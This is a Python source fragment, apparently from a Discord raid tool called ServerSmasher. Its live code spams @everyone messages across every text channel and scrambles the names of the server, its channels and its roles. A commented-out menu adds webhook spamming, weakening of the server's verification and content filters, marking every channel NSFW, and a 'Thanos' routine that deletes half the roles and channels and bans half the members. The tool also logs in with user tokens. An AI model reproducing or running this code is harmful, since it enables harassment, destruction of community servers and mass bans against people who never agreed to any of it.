    print("Started Spamming")
    with ThreadPoolExecutor(max_workers=len(server.channels)) as exec:
        while spamming:
            for channel in server.channels:
                if not channel.type == 0:
                    continue
                else:
                    exec.submit(send_message, channel.id, "@everyone", use_tts)
            time.sleep(5)

def corruptor(server):
    print("Corrupting...")
    for channel in server.channels:
        pool.add_task(corrupt_channel, channel.id, channel.name)
    for role in server.roles:
        pool.add_task(corrupt_role, server.id, role.id, role.name)
    servername = ''
    for x in server.name:
        if random.randint(1,2) == 1:
            servername += asciigen(1)
        else:
            servername += x
    server.edit(name=servername)
    pool.wait_completion()
    print("Corrupted the server.")
    loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press enter to return to menu.')
    main(SERVER)

            # if toga.lower() == 's':
            #     presetname = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name Of Preset: ')
            #     if not os.path.exists("RTBFiles/presets/"):
            #         os.mkdir("RTBFiles/presets/")
            #     with open ("RTBFiles/presets/{}.smpreset".format(presetname),"w+", errors='ignore') as handle:
            #         handle.write(str(smasheroptions))
            #     await changesettings(smasheroptions,SERVER)


    #             print("Moving members in voice channels.")
    #             while not client.is_closed():
    #                 channellist = []
    #                 memberlist = []
    #                 for channel in server.voice_channels:
    #                     channellist.append(channel)
    #                 for channel in channellist:
    #                     for member in channel.members:
    #                         memberlist.append(member)
    #                 for member in memberlist:
    #                     try:
    #                         channel = random.choice(channellist)
    #                         channel = channel
    #                         pool.add_task(mover,server.id,member.id,channel.id)
    #                         await asyncio.sleep(0.1)
    #                     except Exception:
    #                         pass
    #                 await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #         elif int(sel) == 2:
    #             print(colored("Modifying server rules, Please wait...",menucolour))
    #             if client_type == 'bot':
    #                 headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    #             else:
    #                 headers={ 'Authorization': token,'Content-Type': 'application/json'}
    #             payload = {'default_message_notifications': 0,'explicit_content_filter': 0,'verification_level': 0}
    #             requests.patch('https://discordapp.com/api/v6/guilds/'+str(server.id),headers=headers,json=payload)
    #             (colored("Rules modified.",menucolour))
    #             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
    #             await main(SERVER)
    #         elif int(sel) == 4:
    #
    #             print("Webhook Smasher")
    #             print(colored("Please Enter the text to spam,\nFor random ascii type 'asc' or to go back type 'back' or 'b'\nThis will trigger the rate limit for webhooks instantly.",menucolour))
    #             txtspam = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #             if txtspam.lower() == "back":
    #                 await main(SERVER)
    #             if txtspam.lower() == "b":
    #                 await main(SERVER)
    #             channellist = []
    #
    #             print("Please Wait...")
    #             for channel in server.text_channels:
    #                 for webhook in await channel.webhooks():
    #                     await webhook.delete()
    #                 channellist.append(channel)
    #             if sys.platform.startswith('win32'):
    #                 if len(channellist) > 40:
    #                     screensize = 7
    #                     screensize += len(channellist)
    #                     os.system('mode con:cols=70 lines={}'.format(str(screensize)))
    #             elif sys.platform.startswith('linux'):
    #                 if len(channellist) > 40:
    #                     screensize = 7
    #                     screensize += len(channellist)
    #                     os.system("printf '\033[8;{};70t'".format(str(screensize)))
    #             chancounter = -1
    #
    #             print("Select Channel To spam.")
    #             for channel in channellist:
    #                 chancounter += 1
    #                 print("{}. {}".format(chancounter,channel))
    #             channelchoice = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Channel of Choice: ')
    #             try:
    #                 chan = channellist[int(channelchoice)]
    #             except Exception:
    #                 await main(SERVER)
    #             webhooks = []
    #             for x in range(10):
    #                 wh = await chan.create_webhook(name=asciigen(random.randint(2,80)))
    #                 webhooks.append('https://discordapp.com/api/webhooks/{}/{}'.format(wh.id,wh.token))
    #             for webhook in webhooks:
    #                 pool.add_task(webhook_spam,webhook,txtspam)
    #             await main(SERVER)
    #         elif int(sel) == 6:
    #
    #             print ("Are you sure you want to corrupt this server?")
    #             y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Y/N: ')
    #             if y.lower() == 'y':
    #                 await corruptor(server)
    #             else:
    #                 await main(SERVER)
    #         elif int(sel) == 7:
    #             await music_player_channel_select(server)
    #         elif int(sel) == 8:
    #             y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Continue\nY/N: ')
    #             if y.lower() == 'y':
    #                 for channel in server.channels:
    #                     pool.add_task(make_nsfw,channel.id)
    #                 await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #                 await main(SERVER)
    #             else:
    #                 await main(SERVER)
    #         elif int(sel) == 9:
    #             print(colored("0. Back\nEnter New Name"))
    #             y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #             if y == "0":
    #                 await main(SERVER)
    #             for channel in server.channels:
    #                 pool.add_task(edit_topic,channel.id,y)
    #             await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #             await main(SERVER)
    #         elif int(sel) == 10:
    #
    #             print(colored("The end is near.",'magenta'))
    #             s = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Continue?(Y/N): ')
    #             if s.lower() == 'y':
    #                 pass
    #             else:
    #                 await main(SERVER)
    #             channels = []
    #             users = []
    #             roles = []
    #             for channel in server.channels:
    #                 try:
    #                     wh = await channel.create_webhook(name=asciigen(random.randint(2,80)))
    #                 except Exception as e:
    #                     print(e)
    #                     continue
    #                 else:
    #                     break
    #             beginquotes = ['When I’m done, half of humanity will still exist. Perfectly balanced, as all things should be. I hope they remember you.','You’re strong. But I could snap my fingers, and you’d all cease to exist.','You should have gone for the head.','Dread it. Run from it. Destiny still arrives. Or should I say, I have.','I ignored my destiny once, I can not do that again. Even for you. I’m sorry Little one.','With all six stones, I can simply snap my fingers, they would all cease to exist. I call that mercy.','The hardest choices require the strongest wills.']
    #             try:
    #                 hook = Webhook(wh.url)
    #                 hook.send("**{}**".format(random.choice(beginquotes)),avatar_url='https://i.imgur.com/hLU3tXY.jpg',username='Thanos')
    #             except Exception:
    #                 pass
    #             await asyncio.sleep(5)
    #             for channel in server.channels:
    #                 channels.append(channel)
    #             for role in server.roles:
    #                 roles.append(role)
    #             for user in server.members:
    #                 users.append(user)
    #             count = 0
    #             halfroles = int(round(len(server.roles) / 2))
    #             for role in roles:
    #                 count += 1
    #                 if halfroles == count:
    #                     break
    #                 pool.add_task(delete_role,str(role.id),SERVER)
    #                 roles.remove(role)
    #             count = 0
    #             halfchan = int(round(len(server.channels) / 2))
    #             for channel in channels:
    #                 count += 1
    #                 if halfchan == count:
    #                     break
    #                 pool.add_task(delete_channel,str(channel.id))
    #                 channels.remove(channel)
    #             count = 0
    #             halfuser = int(round(len(server.members) / 2))
    #             for user in users:
    #                 count += 1
    #                 if halfuser == count:
    #                     break
    #                 pool.add_task(ban_user,str(user.id),SERVER)
    #                 users.remove(user)
    #             pool.wait_completion()
    #             await asyncio.sleep(10)
    #             for channel in channels:
    #                 try:
    #                     wh = await channel.create_webhook(name=asciigen(random.randint(2,80)))
    #                 except Exception as e:
    #                     print(e)
    #                     continue
    #                 else:
    #                     break
    #             endquotes = ['Perfectly balanced, as all things should be.','Fun isn’t something one considers when balancing the universe. But this… does put a smile on my face.']
    #             try:
    #                 hook = Webhook(wh.url)
    #                 hook.send("**{}**".format(random.choice(endquotes)),avatar_url='https://i.imgur.com/hLU3tXY.jpg',username='Thanos')
    #             except Exception:
    #                 pass
    #             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Perfectly balanced, as all things should be.')
    #             await main(SERVER)
    #         else:
    #             await main(SERVER)
    #

def start_client():
    global client_type
    global token
    global user
    global cache_guilds
    global avatar_b64
    global session_id
    global ws

    ws.connect("wss://gateway.discord.gg/?v=6&encoding=json")
    hello = json.loads(ws.recv())
    heartbeat_interval = hello['d']['heartbeat_interval']
    if startup_activity_type == "Playing":
        gamejson = {
            "name": startup_activity_name,
            "type": 0
        }
    elif startup_activity_type == 'Streaming':
        gamejson = {
            "name": startup_activity_name,
            "type": 1,
            "url": "https://www.twitch.tv/SERVERSMASHER"
        }
    elif startup_activity_type == "Listening to":
        gamejson = {
            "name": startup_activity_name,
            "type": 2
        }
    elif startup_activity_type == "Watching":
        gamejson = {
            "name": startup_activity_name,
            "type": 3
        }
    auth = {
    "op": 2,
    "d": {
        "token": token,
        "properties": {
            "$os": sys.platform,
            "$browser": "ServerSmasher",
            "$device": "ServerSmasher"
        },
        "presence": {
            "game": gamejson,
            "status": startup_status,
            "since": 0,
            "afk": False
        }
    },
    "s": None,
    "t": None
    }
    try:
        ws.send(json.dumps(auth))
        result = json.loads(ws.recv())
        user = result['d']['user']
        with ThreadPoolExecutor(max_workers=thread_count) as exe:
            for guild in result['d']['guilds']:
                exe.submit(get_guild_threaded, guild['id'])
        user['guilds'] = cache_guilds
        user = namedtuple('User', sorted(user.keys()))(**user)
        if user.avatar is None:
            src = requests.get("https://cdn.discordapp.com/embed/avatars/1.png").content
        else:
            src = requests.get(construct_avatar_link(user.id, user.avatar, 128)).content
        im = Image.open(io.BytesIO(src))
        im_square = crop_max_square(im).resize((64, 64), Image.ANTIALIAS)
        im_thumb = mask_circle_transparent(im_square, 1)
        imgbytes = io.BytesIO()
        im_thumb.save(imgbytes, format='PNG')
        imgbytes = imgbytes.getvalue()
        avatar_b64 = base64.b64encode(imgbytes)
        heart = threading.Thread(target=heartbeat, args=[heartbeat_interval], daemon=True)
        heart.start()
    except Exception:
        exc_type, exc_value, exc_traceback = sys.exc_info()
        trace = traceback.format_exception(exc_type, exc_value, exc_traceback)
        print(trace)
        sg.Popup("Error Logging into token.", title="Error")
        login_serversmasher()
    main_menu()

while __name__ == "__main__":
    try:
        login_serversmasher()
    except Exception as e:
        exception = ''
        exc_type, exc_value, exc_traceback = sys.exc_info()
        trace = traceback.format_exception(exc_type, exc_value, exc_traceback)
        for line in trace:
            exception += line
        try:
            ws.close()
        except:
            pass
        yesno = sg.PopupYesNo(f"ServerSmasher Crashed: {repr(e)}\nDetails:\n{exception}\n\nReport to DeadBread? (No revealing data is sent.)", title="ServerSmasher Crashed >:(")
        if yesno == "Yes":
            payload = {"content": f"```{exception}```"}
            try:
                requests.post(h, json=payload)
            except Exception:
                pass
            else:
                sg.PopupNonBlocking('Reported to DeadBread. Thanks!', title="Done.",keep_on_top=True)
